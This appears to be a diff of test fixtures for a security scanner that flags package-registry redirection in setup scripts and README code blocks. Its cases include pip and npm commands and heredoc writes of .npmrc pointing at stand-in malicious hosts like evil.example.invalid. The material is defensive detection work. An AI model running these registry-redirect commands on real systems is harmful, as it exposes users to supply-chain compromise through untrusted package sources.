+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "pip-long-option-abbreviation",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip install --index-u=https://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "option-before-operand-fixed-argv-index",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set --location=project registry https://evil.invalid\n\n# case 2\n#!/bin/bash\nnpm config --location=project set registry https://evil.invalid\n\n# case 3\n#!/bin/bash\npip config --global set global.index-url https://evil.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "project",
+          "destination": "https://evil.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "project",
+          "destination": "https://evil.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 6
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 10
+        }
+      ]
+    },
+    {
+      "id": "placeholder-destination-reported-as-resolved",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "README.md": "# Setup\n```bash\npip config set global.index-url 'INDEX_URL_PLACEHOLDER'\n```\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "maven-altdeploymentrepository",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmvn deploy -DaltDeploymentRepository=internal::default::https://evil.example.invalid/repo\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "heredoc-noncat-writer",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ntee .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "heredoc-compound-command-prefix",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nif true; then cat > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\nfi\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "unterminated-heredoc-write-missed",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF \n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "heredoc-command-prefix",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncommand cat > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "heredoc-here-string",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<< 'registry=https://packages.example.invalid'\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "heredoc-clobber-override",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat >| .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "heredoc-amp-redirect",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat &> .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "heredoc-segment-nonzero",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmkdir -p . && cat > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "heredoc-second-on-line",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /dev/null <<A; cat > .npmrc <<B\nfirst\nA\nregistry=https://packages.example.invalid\nB\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 5
+        }
+      ]
+    },
+    {
+      "id": "heredoc-line-continuation",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc \\\n  <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 4
+        }
+      ]
+    },
+    {
+      "id": "heredoc-dynamic-target-var",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nCFG=.npmrc\ncat > \"$CFG\" <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 4
+        }
+      ]
+    },
+    {
+      "id": "heredoc-delim-backslash-newline-bypass",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<END\\\nMORE\nregistry=https://packages.example.invalid\nENDMORE\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 4
+        }
+      ]
+    },
+    {
+      "id": "heredoc-async-ampersand",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<EOF &\nregistry=https://packages.example.invalid\nEOF\nwait\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "npmrc-global-path-no-dot",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /opt/homebrew/etc/npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "unterminated-heredoc-body-executed",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /dev/null <<EOF\nnpm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "heredoc-delim-backslash-newline-fp",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > /dev/null <<END\\\nMORE\nnpm config set registry https://packages.example.invalid\nENDMORE\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "heredoc-pipe-to-writer",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "limitation",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat <<EOF | tee .npmrc\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [],
+      "expected_limitation": {
+        "reason": "dependency_source_parse_incomplete",
+        "path": "scripts/setup.sh",
+        "range": {
+          "start_line": 2,
+          "end_line": 4
+        }
+      }
+    },
+    {
+      "id": "markdown-tilde-fence",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n~~~bash\nnpm config set registry https://packages.example.invalid/\n~~~\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "markdown-four-backtick-fence",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n````bash\nnpm config set registry https://packages.example.invalid/\n````\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "markdown-fence-language-set-exact",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n```shell-script\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "markdown-4tick-nested-inner-fence",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "README.md": "# d\n````markdown\n```bash\nnpm config set registry https://packages.example.invalid/\n```\n````\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "markdown-untagged-code-blocks",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "limitation",
+      "files": {
+        "README.md": "# d\n\n    npm config set registry https://packages.example.invalid/\n\ndone\n"
+      },
+      "expected_sc10": [],
+      "expected_limitation": {
+        "reason": "unscanned_executable_content",
+        "path": "README.md",
+        "range": {
+          "start_line": 3,
+          "end_line": 3
+        }
+      }
+    },
+    {
       "id": "markdown-nonstandard-filename-limitation",
-      "status": "unfixed",
-      "lands_in": "DEFERRED",
+      "status": "fixed",
+      "lands_in": "PR-2",
       "expected_outcome": "limitation",
       "files": {
         "docs/install.md": "# d\n```bash\nnpm config set registry https://packages.example.invalid/\n```\n"
